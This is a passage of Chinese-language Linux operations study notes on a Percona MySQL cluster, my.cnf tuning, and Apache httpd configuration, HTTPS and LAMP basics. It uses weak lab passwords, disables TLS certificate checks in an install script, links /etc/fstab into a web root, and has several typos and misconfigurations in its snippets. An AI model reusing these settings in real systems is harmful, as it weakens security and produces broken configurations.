2022-05-30T18:13:04.385327Z 1 [Note] A temporary password is generated for root@localhost: Fv)vKh#pl2k9


#5.修改密码
[root@pxc1 ~]# mysql -uroot -p'Fv)vKh#pl2k9'
mysql> alter user 'root'@'localhost' identified by '123456';


#6.#创建相关用户并授权
mysql> CREATE USER 'sstuser'@'localhost' IDENTIFIED BY 's3cretPass';
mysql> GRANT RELOAD, LOCK TABLES, PROCESS, REPLICATION CLIENT ON *.* TO 'sstuser'@'localhost';
#查看相关状态变量

*************************** 66. row ***************************
Variable_name: wsrep_cluster_size：Value: 1
[root@pxc1 ~]# mysql -uroot -p123456 -e " show status like 'wsrep%'" |grep size
wsrep_cert_index_size	1
wsrep_gcache_pool_size	2456
wsrep_cluster_size	3  #已经连接的三个集群
```

**3.pxc2:10.0.0.17**

```
#1.安装包
[11:03:52 root@pxc2 ~]#yum install Percona-XtraDB-Cluster-57 -y


#2.修改PXC的配置文件
[root@pxc2 ~]# vim /etc/percona-xtradb-cluster.conf.d/wsrep.cnf
#in order to do that you need to bootstrap this node
wsrep_cluster_address=gcomm://10.0.0.7,10.0.0.17,10.0.0.27
# Node IP address
wsrep_node_address=10.0.0.17 #指定本机的ip
# Cluster name
wsrep_cluster_name=pxc-cluster-liu

#If wsrep_node_name is not specified,  then system hostname will be used
wsrep_node_name=pxc-cluster-node-2-liu

#Authentication for SST method
wsrep_sst_auth="sstuser:s3cretPass"

#3.启动服务
[root@pxc2 ~]# systemctl start mysql
```

**4.pxc3:10.0.0.27**

```
#1.安装包
[11:03:52 root@pxc3 ~]#yum install Percona-XtraDB-Cluster-57 -y


#2.修改PXC的配置文件
[root@pxc2 ~]# vim /etc/percona-xtradb-cluster.conf.d/wsrep.cnf
# Node IP address
wsrep_node_address=10.0.0.27 #指定本机的ip
# Cluster name
wsrep_cluster_name=pxc-cluster-liu

#If wsrep_node_name is not specified,  then system hostname will be used
wsrep_node_name=pxc-cluster-node-3-liu


#3.启动服务
[root@pxc2 ~]# systemctl start mysql
```

**5.pxc4:10.0.0.37**

```
#1.安装包
[11:03:52 root@pxc4 ~]#yum install Percona-XtraDB-Cluster-57 -y

#2.修改PXC的配置文件
[root@pxc2 ~]# vim /etc/percona-xtradb-cluster.conf.d/wsrep.cnf
# Node IP address
wsrep_node_address=10.0.0.27 #指定本机的ip
# Cluster name
wsrep_cluster_name=pxc-cluster-liu

#If wsrep_node_name is not specified,  then system hostname will be used
wsrep_node_name=pxc-cluster-node-4-liu


#3.启动服务
[root@pxc2 ~]# systemctl start mysql
```

#### 35.10生产环境my.cnf配置案例

```
#打开独立表空间
innodb_file_per_table = 1
#MySQL 服务所允许的同时会话数的上限，经常出现Too Many Connections的错误提示，则需要增大此值
max_connections = 8000
#所有线程所打开表的数量
open_files_limit = 10240
#back_log 是操作系统在监听队列中所能保持的连接数
back_log = 300
#每个客户端连接最大的错误允许数量，当超过该次数，MYSQL服务器将禁止此主机的连接请求，直到MYSQL
服务器重启或通过flush hosts命令清空此主机的相关信息
max_connect_errors = 1000
#每个连接传输数据大小.最大1G，须是1024的倍数，一般设为最大的BLOB的值
max_allowed_packet = 32M #指定一个请求的最大连接时间
wait_timeout = 10
# 排序缓冲被用来处理类似ORDER BY以及GROUP BY队列所引起的排序
sort_buffer_size = 16M 
#不带索引的全表扫描.使用的buffer的最小值
join_buffer_size = 16M 
#查询缓冲大小
query_cache_size = 128M #指定单个查询能够使用的缓冲区大小，缺省为1M
query_cache_limit = 4M    
# 设定默认的事务隔离级别
transaction_isolation = REPEATABLE-READ
# 线程使用的堆大小. 此值限制内存中能处理的存储过程的递归深度和SQL语句复杂性，此容量的内存在每次连接时被预留.
thread_stack = 512K 
# 二进制日志功能
log-bin=/data/mysqlbinlogs/
#二进制日志格式
binlog_format=row
#InnoDB使用一个缓冲池来保存索引和原始数据, 可设置这个变量到物理内存大小的80%
innodb_buffer_pool_size = 24G 
#用来同步IO操作的IO线程的数量
innodb_file_io_threads = 4 #在InnoDb核心内的允许线程数量，建议的设置是CPU数量加上磁盘数量的两倍
innodb_thread_concurrency = 16
# 用来缓冲日志数据的缓冲区的大小
innodb_log_buffer_size = 16M
在日志组中每个日志文件的大小
innodb_log_file_size = 512M 
# 在日志组中的文件总数
innodb_log_files_in_group = 3
# SQL语句在被回滚前,InnoDB事务等待InnoDB行锁的时间
innodb_lock_wait_timeout = 120
#慢查询时长
long_query_time = 2 #将没有使用索引的查询也记录下来
log-queries-not-using-indexes
```

## 36.WEB服务器APACHE

### 36.1 浏览器访问网站过程

![1654612514416](linuxSRE.assets/1654612514416.png)

### 36.2HTTP请求访问的过程

![1654424026430](linuxSRE.assets/1654424026430.png)

### 36.3MPM工作模式

**prefork：**多进程I/O模型，每个进程响应一个请求，CentOS 7 httpd默认模型

一个主进程：生成和回收n个子进程，创建套接字，不响应请求

多个子进程：工作 work进程，每个子进程处理一个请求；系统初始时，预先生成多个空闲进程，等待请求

![1654567612500](linuxSRE.assets/1654567612500.png)

Prefork MPM预派生模式，有一个主控制进程，然后生成多个子进程,每个子进程有一个独立的线程响应用户请求，相对比较占用内存，但是比较稳定，可以设置最大和最小进程数，是最古老的一种模式，也是最稳定的模式，适用于访问量不是很大的场景

优点：稳定

缺点：慢，占用资源，不适用于高并发场景



**worker：**复用的多进程I/O模型,多进程多线程，IIS使用此模型

一个主进程：生成m个子进程，每个子进程负责生个n个线程，每个线程响应一个请求，并发响应请求：m*n

![1654567710885](linuxSRE.assets/1654567710885.png)

优点：相比prefork 占用的内存较少，可以同时处理更多的请求

缺点：使用keep-alive的长连接方式，某个线程会一直被占据，即使没有传输数据，也需要一直等待到超时才会被释放。如果过多的线程，被这样占据，也会导致在高并发场景下的无服务线程可用。（该问题在prefork模式下，同样会发生）



**event：**事件驱动模型（worker模型的变种），CentOS8 默认模型

![1654567780901](linuxSRE.assets/1654567780901.png)

一个主进程：生成m个子进程，每个子进程负责生个n个线程，每个线程响应一个请求，并发响应请求：m*n，有专门的监控线程来管理这些keep-alive类型的线程，当有真实请求时，将请求传递给服务线程，执行完毕后，又允许释放。这样增强了高并发场景下的请求处理能力



优点：单线程响应多请求，占据更少的内存，高并发下表现更优秀，会有一个专门的线程来管理keep-alive类型的线程，当有真实请求过来的时候，将请求传递给服务线程，执行完毕后，又允许它释放

缺点：没有线程安全控制

### 36.4编译安装httpd-2.4.53

```
###################################################################
# File Name: install_httpd.sh
# Author: liusenbiao
# mail: 1805336068@qq.com
# Created Time: Mon 06 Jun 2022 11:22:37 AM CST
#=============================================================
#!/bin/bash
APR_URL=https://mirrors.tuna.tsinghua.edu.cn/apache/apr/
APR_FILE=apr-1.7.0
TAR=.tar.bz2
APR_UTIL_URL=https://mirrors.tuna.tsinghua.edu.cn/apache/apr/
APR_UTIL_FILE=apr-util-1.6.1
HTTPD_URL=https://mirrors.tuna.tsinghua.edu.cn/apache/httpd/
HTTPD_FILE=httpd-2.4.53
INSTALL_DIR=/data/httpd-2.4.53
CPUS=`lscpu | awk '/^CPU\(s\)/{print $2}'`
MPM=event
install_httpd(){
if [ `awk -F'"' '/^ID=/{print $2}' /etc/os-release` == "centos" ] &> /dev/null;then
  yum -y install gcc make expat-devel pcre-devel openssl-devel wget bzip2
else
  sudo apt update
  sudo apt -y install gcc libapr1-dev libaprutil1-dev libpcre3 libpcre3-dev libssl-dev wget make
fi

cd /usr/local/src
wget $APR_URL$APR_FILE$TAR --no-check-certificate && wget $APR_UTIL_URL$APR_UTIL_FILE$TAR --no-check-certificate  && wget $HTTPD_URL$HTTPD_FILE$TAR --no-check-certificate
tar xf $APR_FILE$TAR && tar xf $APR_UTIL_FILE$TAR && tar xf $HTTPD_FILE$TAR
mv $APR_FILE $HTTPD_FILE/srclib/apr
mv $APR_UTIL_FILE $HTTPD_FILE/srclib/apr-util
cd $HTTPD_FILE
./configure --prefix=$INSTALL_DIR --enable-so --enable-ssl --enable-cgi --enable-rewrite --with-zlib --with-pcre --with-included-apr --enable-modules=most --enable-mpms-shared=all --with-mpm=$MPM
make -j $CPUS && make install
useradd -s /sbin/nologin -r apache
sed -i 's/daemon/apache' $INSTALL_DIR/conf/httpd.conf
echo "PATH=$INSTALL_DIR/bin:$PATH" > /etc/profile.d/$HTTPD_FILE.sh
. /etc/profile.d/$HTTPD_FILE.sh
cat > /lib/systemd/system/httpd.service <<EOF
[Unit]
Description=The Apache HTTP Server
After=network.target remote-fs.target nss-lookup.target
Documentation=man:httpd(8)
Documentation=man:apachectl(8)
[Service]
Type=forking
ExecStart=${INSTALL_DIR}/bin/apachectl start
ExecReload=${INSTALL_DIR}/bin/apachectl graceful
ExecStop=${INSTALL_DIR}/bin/apachectl stop
killSignal=SIGCONT
PrivateTmp=true
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable --now httpd
}

install_httpd
```

![1654508978791](linuxSRE.assets/1654508978791.png)

### 36.5Httpd的常见配置

```
#0.关闭httpd -t报错提示
root@centos8 ~]# vim /etc/httpd/conf/httpd.conf
#把第203行取消注释
ServerName www.example.com:80




#1.多端口开启以及安全保护
[root@centos8 ~]# vim /etc/httpd/conf.d/test.conf
listen 8080   #子配置文件再开8080端口
ServerTokens prod  #隐藏版本号
[root@centos8 ~]# systemctl restart httpd



#2.持久连接
连接建立，每个资源获取完成后不会断开连接，而是继续等待其它的请求完成，默认开启持久连接
[root@centos8 ~]# vim /etc/httpd/conf.d/test.conf
KeepAliveTimeout  15      #连接持续15s,可以以ms为单位,默认值为5s
MaxKeepAliveRequests 500  #持久连接最大接收的请求数,默认值100



#3.DSO (Dynamic Shared Object)
Dynamic Shared Object，加载动态模块配置，不需重启即生效
动态模块所在路径： /usr/lib64/httpd/modules/
主配置 /etc/httpd/conf/httpd.conf 文件中指定加载模块配置文件

[root@centos8 ~]# httpd -M #查看被加载的模块
[root@centos8 ~]# vim /etc/httpd/conf.modules.d/00-base.conf
里面都是被加载的模块，只要给他们添加注释就不会被加载
LoadModule access_compat_module modules/mod_access_compat.so
#LoadModule actions_module modules/mod_actions.so
LoadModule alias_module modules/mod_alias.so



#4. MPM (Multi-Processing Module) 多路处理模块
修改mpm工作模式，只能选择一个
[root@centos8 ~]# vim /etc/httpd/conf.modules.d/00-mpm.conf
#LoadModule mpm_prefork_module modules/mod_mpm_prefork.so 取消注释即可



#5.prefork模式相关的配置
StartServers       100
MinSpareServers   50
MaxSpareServers   80
ServerLimit     2560 #最多进程数,最大值 20000
MaxRequestWorkers    2560 #最大的并发连接数，默认256
MaxConnectionsPerChild  4000 #子进程最多能处理的请求数量。在处理MaxRequestsPerChild 个
请求之后,子进程将会被父进程终止，这时候子进程占用的内存就会释放(为0时永远不释放）
MaxRequestsPerChild 4000  #从 httpd.2.3.9开始被MaxConnectionsPerChild代替



#6.worker和event模式相关的配置
ServerLimit         16  #最多worker进程数 Upper limit on configurable number of 
processes
StartServers        10  #Number of child server processes created at startup
MaxRequestWorkers  150  #Maximum number of connections that will be processed 
simultaneously
MinSpareThreads     25
MaxSpareThreads     75
ThreadsPerChild     25  #Number of threads created by each child process




#7.定义Main server的文档页面路径
[root@centos8 ~]# vim /etc/httpd/conf/httpd.conf
DocumentRoot +你定义的路径
DocumentRoot "/data/html"

[root@centos8 conf.d]# pwd
/etc/httpd/conf.d
[root@centos8 conf.d]# mv welcome.conf welcome.conf.bak #为了显示Options indexes做的铺垫
[root@centos8 conf.d]# systemctl restart httpd


[root@centos8 ~]# vim /etc/httpd/conf.d/test.conf
在子配置文件完成授权
<directory /你定义的路径>
 Require all granted
</directory>

#案例：
[root@centos8 html]# vim /etc/httpd/conf.d/test.conf
ServerTokens prod
<directory /data/html>
    Require all granted #所有的全部授权
    Options Indexes FollowSymLinks  #列出当前文件下的所有文件列表
</directory>



#8.AllowOverride指令
与访问控制相关的哪些指令可以放在指定目录下的.htaccess（由AccessFileName 指令指定,AccessFileName .htaccess 为默认值）文件中，覆盖之前的配置指令，只对语句有效

AllowOverride All: .htaccess中所有指令都有效
AllowOverride None： .htaccess 文件无效，此为httpd 2.3.9以后版的默认值
AllowOverride AuthConfig .htaccess 文件中，除了AuthConfig 其它指令都无法生效


#放到.htaccess隐藏文件下
[root@centos8 html]# pwd
/data/html
[root@centos8 html]# cat .htaccess
Options Indexes FollowSymLinks

#子配置文件加 AllowOverride All
[root@centos8 html]# vim /etc/httpd/conf.d/test.conf
ServerTokens prod
<directory /data/html>
    Require all granted
    AllowOverride All
</directory>
[root@centos8 conf.d]# systemctl restart httpd



#9.基于客户端IP地址实现访问控制
[root@centos8 html]# vim /etc/httpd/conf.d/test.conf
ServerTokens prod
<directory /data/html>
    <requireAny>
    require all denied
    Require ip 10.0.0.0             
    </requireAny>
    <RequireAll>
    Require all granted
    Require not ip 10.0.0.57 #拒绝特定IP
    require ip  172.16.1.1  #允许特定IP
    </RequireAll>
    AllowOverride All
</directory>


 
#10.日志设定
httpd有两种日志类型
访问日志
错误日志

#10.1错误日志
[root@centos8 ~]# tail -f /var/log/httpd/error_log #查看错误日志

#10.2访问日志
[root@centos8 html]# tail -f /var/log/httpd/access_log 

范例: 通过自定义访问日志格式,实现自定义时间格式
[root@centos8 ~]#vim /etc/httpd/conf/httpd.conf
第200行自定义日期格式
logFormat "%h \"%{%F %T}t\" %>s %{User-Agent}i" testlog
第222行注释掉然后再指定自定义格式
CustomLog "logs/access_log" testlog
[root@centos8 conf.d]# systemctl restart httpd

#最后格式是如下：
10.0.0.7 "2022-06-07 16:00:50" 200 curl/7.29.0



#11.基于用户账号进行认证
#创建基于用户账号进行认证的文件夹
[root@centos8 html]# mkdir admin
root@centos8 html]# echo /data/html/admin/index.html > admin/index.html


#创建账号密码
[root@centos8 html]# cd /etc/httpd/conf.d/
[root@centos8 conf.d]# htpasswd -b .httpuser xiaoming 123456
[root@centos8 conf.d]# htpasswd -b .httpuser xiaohong 123456
[root@centos8 conf.d]# cat .httpuser
xiaoming:$apr1$YVH.HR5m$MXRPccm2Adav3WjYpXNUb1
xiaohong:$apr1$xdcxhGOd$KqH8M42.UWEkMGpt9Eltr.


#修改配置
[root@centos8 conf.d]# vim /etc/httpd/conf.d/test.conf
ServerTokens prod
<directory /data/html>
    Require all granted
</directory>

<directory /data/html/admin>
    AuthType Basic
    AuthName "liusenbiao's warning"
    AuthUserFile "/etc/httpd/conf.d/.httpuser"
    Require  valid-user
</directory>
[root@centos8 conf.d]# systemctl restart httpd




#12.status状态页
httpd 提供了状态页可以用来观察httpd的运行情况。此功能需要加载mod_status.so模块才能实现

#12.1开启状态页功能
[root@centos8 conf.d]# httpd -M | grep status
 status_module (shared)
[root@centos8 conf.d]# vim /etc/httpd/conf.d/test.conf
<Location "/apache_status">
SetHandler server-status
    AuthType Basic
    AuthName "liusenbiao's warning"
    AuthUserFile "/etc/httpd/conf.d/.httpuser"
    Require user xiaoming #只允许xiaoming访问
</Location>
[root@centos8 conf.d]# systemctl restart httpd
浏览器输入：http://10.0.0.8/apache_status




#13.多虚拟主机
httpd 支持在一台物理主机上实现多个网站，即多虚拟主机
多虚拟主机有三种实现方案：
基于ip：为每个虚拟主机准备至少一个ip地址
基于port：为每个虚拟主机使用至少一个独立的port
基于FQDN：为每个虚拟主机使用至少一个FQDN，请求报文中首部 Host: www.magedu.com



#案例：搭建3个网站
#13.1创建三个网站的目录和网页
[root@centos8 ~]# cd /data/
[root@centos8 data]# ls
html
[root@centos8 data]# echo www.a.com on website1 > website1/index.html
[root@centos8 data]# echo www.b.com on website2 > website2/index.html
[root@centos8 data]# echo www.c.com on website3 > website3/index.html
[root@centos8 data]# tree
.
├── html
│   ├── admin
│   │   └── index.html
│   ├── a.txt -> /etc/fstab
│   ├── dir1
│   ├── download
│   │   └── Xshell.exe
│   ├── index.html
│   └── news
│       └── news.html
├── website1
│   └── index.html
├── website2
│   └── index.html
└── website3
    └── index.html

8 directories, 8 files


#13.2基于ip地址实现
#创建三个网站对应的ip地址(不推荐)
因为需要配三个公网ip，成本太大！
[root@centos8 data]# ip a a 10.0.0.101/24 dev eth0 label eth0:1
[root@centos8 data]# ip a a 10.0.0.102/24 dev eth0 label eth0:2
[root@centos8 data]# ip a a 10.0.0.103/24 dev eth0 label eth0:3

#创建对应的配置文件
[root@centos8 data]# vim /etc/httpd/conf.d/test.conf

<virtualhost 10.0.0.101:80>
documentroot /data/website1
<directory /data/website1>
    Require all granted
</directory>
</virtualhost>

<virtualhost 10.0.0.102:80>
documentroot /data/website2
<directory /data/website2>
    Require all granted
</directory>
</virtualhost>

<virtualhost 10.0.0.103:80>
documentroot /data/website3
<directory /data/website3>
    Require all granted
</directory>
</virtualhost>
systemctl restart httpd




基于port实现(不推荐)
一般人懒得敲端口号！！！！
[root@centos8 data]# nmcli connection up eth0
[root@centos8 data]# vim /etc/httpd/conf.d/test.conf 
listen 81
listen 82
listen 83

<virtualhost *:81>
documentroot /data/website1
<directory /data/website1>
    Require all granted
</directory>
</virtualhost>

<virtualhost *:82>
documentroot /data/website2
<directory /data/website2>
    Require all granted
</directory>
</virtualhost>

<virtualhost *:83>
documentroot /data/website3
<directory /data/website3>
    Require all granted
</directory>
</virtualhost>




基于FQDN(域名解析)：推荐：生产中用的最多
centos7的配置host文件
[18:06:20 root@centos7 ~]#vim /etc/hosts
10.0.0.8 www.a.com www.b.com www.c.com

#完成了centos8配置以后测试
[20:55:01 root@centos7 ~]#curl www.c.com
www.c.com on website3
[21:02:10 root@centos7 ~]#curl www.b.com
www.b.com on website2
[21:02:14 root@centos7 ~]#curl www.a.com
www.a.com on website1


#centos8配置
[root@centos8 data]# vim /etc/httpd/conf.d/test.conf 
<virtualhost *:80>
servername www.a.com
documentroot /data/website1
<directory /data/website1>
    Require all granted
</directory>
</virtualhost>

<virtualhost *:80>
servername www.b.com
documentroot /data/website2
<directory /data/website2>
    Require all granted
</directory>
</virtualhost>

<virtualhost *:80>
servername www.c.com
documentroot /data/website3
<directory /data/website3>
    Require all granted
</directory>
</virtualhost>
[root@centos8 data]# systemctl restart httpd




#14.压缩
适用场景：
(1) 节约带宽，额外消耗CPU；同时，可能有些较老浏览器不支持
(2) 压缩适于压缩的资源，例如文本文件

#14.1压缩指令
#可选项
SetOutputFilter DEFLATE  
# 指定对哪种MIME类型进行压缩，必须指定项
AddOutputFilterByType DEFLATE text/plain 
AddOutputFilterByType DEFLATE text/html
AddOutputFilterByType DEFLATE application/xhtml+xml
AddOutputFilterByType DEFLATE text/xml
AddOutputFilterByType DEFLATE application/xml
AddOutputFilterByType DEFLATE application/x-javascript
AddOutputFilterByType DEFLATE text/javascript
AddOutputFilterByType DEFLATE text/css
#压缩级别 (Highest 9 - Lowest 1)
DeflateCompressionLevel 9 #排除特定旧版本的浏览器，不支持压缩
#Netscape 4.x 只压缩text/html
BrowserMatch ^Mozilla/4 gzip-only-text/html
#Netscape 4.06-08 三个版本 不压缩
BrowserMatch ^Mozilla/4\.0[678] no-gzip
#Internet Explorer标识本身为"Mozilla / 4”，但实际上是能够处理请求的压缩。如果用户代理首部
匹配字符串"MSIE”（"B”为单词边界”），就关闭之前定义的限制
BrowserMatch \bMSI[E] !no-gzip !gzip-only-text/html



#14.2开启压缩功能
[root@centos8 data]# vim /etc/httpd/conf.d/test.conf
<virtualhost *:80>
servername www.a.com
documentroot /data/website1
<directory /data/website1>
    Require all granted
</directory>
AddOutputFilterByType DEFLATE text/plain
AddOutputFilterByType DEFLATE text/html
DeflateCompressionLevel 9
</virtualhost>
```

### 36.6实现https

#### 36.6.1 HTTPS 会话的简化过程

![1654609829565](linuxSRE.assets/1654609829565.png)

#### 36.6.2生成自签名证书

```
[root@centos8 ~]#yum -y install   mod_ssl
[root@centos7 ~]#cd /etc/pki/tls/certs
[root@centos7 certs]#pwd
/etc/pki/tls/certs
[root@centos7 certs]#ls 
ca-bundle.crt ca-bundle.trust.crt make-dummy-cert Makefile renew-dummy-cert
[root@centos7 certs]#vim Makefile 
#/usr/bin/openssl genrsa -aes128 $(KEYLEN) > $@
/usr/bin/openssl genrsa  $(KEYLEN) > $@    
[root@centos7 certs]#make magedu.org.crt
umask 77 ; \
#/usr/bin/openssl genrsa -aes128 2048 > magedu.org.key
/usr/bin/openssl genrsa  2048 > magedu.org.key
Generating RSA private key, 2048 bit long modulus
......................+++
...+++
e is 65537 (0x10001)
umask 77 ; \
/usr/bin/openssl req -utf8 -new -key magedu.org.key -x509 -days 365 -out
magedu.org.crt 
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [XX]:CN
State or Province Name (full name) []:beijing
Locality Name (eg, city) [Default City]:beijing
Organization Name (eg, company) [Default Company Ltd]:magedu
Organizational Unit Name (eg, section) []:devops
Common Name (eg, your name or your server's hostname) []:www.magedu.org
Email Address []:
[root@centos7 certs]#ls
ca-bundle.crt ca-bundle.trust.crt magedu.org.crt magedu.org.key make-dummycert Makefile renew-dummy-cert
```

#### 36.6.3互联网网站证书实现

```
[root@centos8 ~]#dnf -y install   mod_ssl
[root@centos8 ~]#ll /etc/httpd/conf.d/ssl/
total 24
-rw-r--r-- 1 root root 1679 Dec 10  2019 www.wangxiaochun.com_chain.crt
-rw-r--r-- 1 root root 1675 Dec 10  2019 www.wangxiaochun.com.key
-rw-r--r-- 1 root root 2021 Dec 10  2019 www.wangxiaochun.com_public.crt
[root@centos8 ~]#cd /etc/httpd/conf.d/ssl/
[root@centos8 ssl]#openssl x509 -in www.wangxiaochun.com_public.crt -noout -text
[root@centos8 ~]#grep -Ev "^ *#|^$" /etc/httpd/conf.d/ssl.conf
```

#### 36.6.4URL重定向

```
#0.status状态：
permanent： 返回永久重定向状态码 301,此重定向信息进行缓存
temp：返回临时重定向状态码302. 此为默认值


范例:
[root@centos8 ~]# vim /etc/httpd/conf.d/test.conf
Redirect permanent / https://www.magedu.com/


#1.http实现重定向https
[root@centos8 ~]# vim /etc/httpd/conf.d/test.conf
RewirteEngine on
RewriteRule ^(/.*)$ https://%{HTTP_HOST}$1 [redirect=301]
```

![1654611390915](linuxSRE.assets/1654611390915.png)

### 36.7http协议及报文头部结构

#### 36.7.1HTTP请求报文

![1654613417067](linuxSRE.assets/1654613417067.png)

#### 36.7.2HTTP响应报文

![1654613818218](linuxSRE.assets/1654613818218.png)

#### 36.7.3HTTP报文格式

```
#0.Method方法
请求方法，标明客户端希望服务器对资源执行的动作，包括以下：
GET： 从服务器获取一个资源
HEAD： 只从服务器获取文档的响应首部
POST： 向服务器输入数据，通常会再由网关程序继续处理
PUT： 将请求的主体部分存储在服务器中，如上传文件
DELETE： 请求删除服务器上指定的文档
TRACE：追踪请求到达服务器中间经过的代理服务器
OPTIONS：请求服务器返回对指定资源支持使用的请求方法
CONNECT：建立一个到由目标资源标识的服务器的隧道
PATCH：用于对资源应用部分修改




#1.http协议状态码分类
1xx：100-101 信息提示
2xx：200-206 成功
3xx：300-307 重定向
4xx：400-415 错误类信息，客户端错误
5xx：500-505 错误类信息，服务器端错误


#1.1http协议常用的状态码
200： 成功，请求数据通过响应报文的entity-body部分送;OK
301： 请求的URL指向的资源已经被删除；但在响应报文中通过首部Location指明了资源现在所处的新位置；Moved Permanently
302： 响应报文Location指明资源临时新位置 Moved Temporarily
304： 访问浏览器页面，服务器已经把资源给你了，下次直接走缓存，没必要直接再次申请资源，提高了效率
307: 浏览器自身内部做跳转
401： 需要输入账号和密码认证方能访问资源；Unauthorized
403： 请求被禁止；Forbidden
404： 服务器无法找到客户端请求的资源；Not Found
500： 服务器内部错误；Internal Server Error
502： 代理服务器无法转发请求到真正的网站上，返回Bad Gateway
503： 服务不可用，临时服务器维护或过载，服务器无法处理请求
504： 网关超时
```

#### 36.7.4cookie获取过程

![1654617637926](linuxSRE.assets/1654617637926.png)

```
#第一次请求过程
浏览器第一次发送请求时，不会携带任何cookie信息
服务器接收到请求之后，发现请求中没有任何cookie信息
服务器生成和设置一个cookie.并将此cookie设置通过set_cookie的首部字段保存在响应报文中返回给浏览器浏览器接收到这个响应报文之后，发现里面有cookie信息，浏览器会将cookie信息保存起来

#第二次及其之后的过程
当浏览器第二次及其之后的请求报文中自动cookie的首部字段携带第一次响应报文中获取的cookie信息服务器再次接收到请求之后，会发现请求中携带的cookie信息，这样的话就认识是谁发的请求了之后的响应报文中不会再添加set_cookie首部字段
```

#### 36.7.5session获取过程

![1654618846812](linuxSRE.assets/1654618846812.png)

```
session的工作流程第一次请求:
浏览器发起第一次请求的时候可以携带一些信息(比如:用户名/家码)cookie中没有任何信息。
当服务器接收到这个请求之后，进行用户名和密码的验证，验证成功后则可以设置session信息。
在设置session信息的同时(session信息保存在服务器端)服务器会在响应头中设置一个随机的sessionid的cookie信息
客户端(浏览器)在接收到响应之后，会将cookie信息保存起来(保存sessionid的信息)

第二次及其之后的请求:
第二次及其之后的请求都会携带sessionid信息
当服务器接收到这个请求之后，会获取到sessionid信息，然后进行验证
验证成功，则可以获取session信息(session信息保存在服务器端
```

#### 36.7.6cookie和session比较

```
#cookie和session的相同和不同
1.cookie通常是在服务器生成,但也可以在客户端生成,session是在服务器端生成的
2.session 将数据信息保存在服务器端，可以是内存，文件，数据库等多种形式,cookie 将数据保存在客户端的内存或文件中
3.单个cookie保存的数据不能超过4K，每个站点cookie个数有限制，比如IE8为50个、Firefox为50个、Opera为30个；session存储在服务器，没有容量限制
4.cookie存放在用户本地，可以被轻松访问和修改，安全性不高；session存储于服务器，比较安全
5.cookie有会话cookie和持久cookie，生命周期为浏览器会话期的会话cookie保存在缓存，关闭浏览器窗口就消失，持久cookie被保存在硬盘，知道超过设定的过期时间；随着服务端session存储压力增大，会根据需要定期清理session数据
6.session中有众多数据，只将sessionID这一项可以通过cookie发送至客户端进行保留，客户端下次访问时，在请求报文中的cookie会自动携带sessionID，从而和服务器上的的session进行关联




cookie缺点：
1、使用cookie来传递信息，随着cookie个数的增多和访问量的增加，它占用的网络带宽也很大，试想假如cookie占用200字节，如果一天的PV有几个亿，那么它要占用多少带宽？
2、cookie并不安全，因为cookie是存放在客户端的，所以这些cookie可以被访问到，设置可以通过插件添加、修改cookie。所以从这个角度来说，我们要使用sesssion，session是将数据保存在服务端的，只是通过cookie传递一个sessionId而已，所以session更适合存储用户隐私和重要的数据
session 缺点：
1、不容易在多台服务器之间共享，可以使用session绑定，session复制，session共享解决
2、session存放在服务器中，所以session如果太多会非常消耗服务器的性能
```

## 37.LAMP架构

### 37.1LAMP架构组成

L(N)AMP： 

L：linux

N:  Nginx

A：apache (httpd)

M：mysql, mariadb

P：php, perl, python

![1654657903476](linuxSRE.assets/1654657903476.png)

### 37.2 CGI和fastcgi

```
#1.CGI
CGI：Common Gateway Interface 公共网关接口
CGI 在2000年或更早的时候用得比较多，以前web服务器一般只处理静态的请求，如果碰到一个动态请求怎么办呢？web服务器会根据这次请求的内容，然后会 fork一个新进程来运行外部的 C 程序或者bash,perl脚本等，这个进程会把处理完的数据返回给web服务器，最后web服务器把内容发送给用户，刚才fork的进程也随之退出。 如果下次用户还请求改动态脚本，那么web服务器又再次fork一个新进程，周而复始的进行。
CGI不停的创建进程和销毁进程，效率很差故逐渐被淘汰！！！

请求流程：
Client -- (http协议) --> httpd -- (cgi协议) --> application server (program file) -- (mysql协议) --> mysql




#2.fastcgi
fastcgi的方式是，web服务器收到一个请求时，不会重新fork一个进程（因为这个进程在web服务器启动时就开启了，而且不会退出），web服务器直接把内容传递给这个进程（进程间通信，但fastcgi使用了别的方式，tcp方式通信），这个进程收到请求后进行处理，把结果返回给web服务器，最后自己接着等待下一个请求的到来，而不是退出


请求流程：
Client -- (http协议) --> httpd -- (fastcgi协议) --> fastcgi服务器 -- (mysql协议) --> mysql
```

### 37.3CGI和fastcgi比较

![1654659099513](linuxSRE.assets/1654659099513.png)

### 37.4PHP的环境配置

```
#0.PHP的编译步骤：
Opcode是一种PHP脚本编译后的中间语言，类似于Java的ByteCode,或者.NET的MSL

PHP的语言引擎Zend执行PHP脚本代码一般会经过如下4个步骤
1、Scanning 词法分析,将PHP代码转换为语言片段(Tokens)
2、Parsing 语义分析,将Tokens转换成简单而有意义的表达式
3、Compilation 将表达式编译成Opcode
4、Execution 顺次执行Opcode，每次一条，从而实现PHP脚本的功能
即：扫描-->分析-->编译-->执行




#1.php常见设置：
expose_php = On   #响应报文显示首部字段x-powered-by: PHP/x.y.z，暴露php版本，建议为off 
max_execution_time= 30 #最长执行时间30s
memory_limit=128M #生产不够，可调大
display_errors=off  #调试使用，不要打开，否则可能暴露重要信息
display_startup_errors=off  #建议关闭
post_max_size=8M   #最大上传数据大小，生产可能调大，比下面项大
upload_max_filesize =2M  #最大上传文件，生产可能要调大
max_file_uploads = 20 #同时上传最多文件数
date.timezone =Asia/Shanghai  #指定时区
short_open_tag=on #开启短标签,如: <? phpinfo();?>



#2.搭建LAMP环境检查
[root@centos8 ~]# yum -y install httpd php
[root@centos8 ~]# sed -i 's/;date.timezone =/date.timezone =Asia\/Shanghai/' /etc/php.ini
[root@centos8 ~]# vim /var/www/html/info.php
<?php
 echo date("Y/m/d H:i:s");
 phpinfo();
?>
[root@centos8 ~]# systemctl restart php-fpm httpd
浏览器上输入10.0.0.8/info.php出现页面则表示测试成功！！
```

![1654678792892](linuxSRE.assets/1654678792892.png)

### 37.5实现LAMP

#### 37.5.1PHP连接mysql

```
#0.安装对应的包
#centos8
[root@centos8 ~]# yum -y install php-mysqlnd php httpd mysql-server
#centos7
[root@centos7 ~]# yum -y install php-mysql php httpd mysql-server
[root@centos8 ~]# find /lib64/ -name mysqli.so
/lib64/php/modules/mysqli.so




#1.使用PDO(PHP Data Object)扩展连接数据库
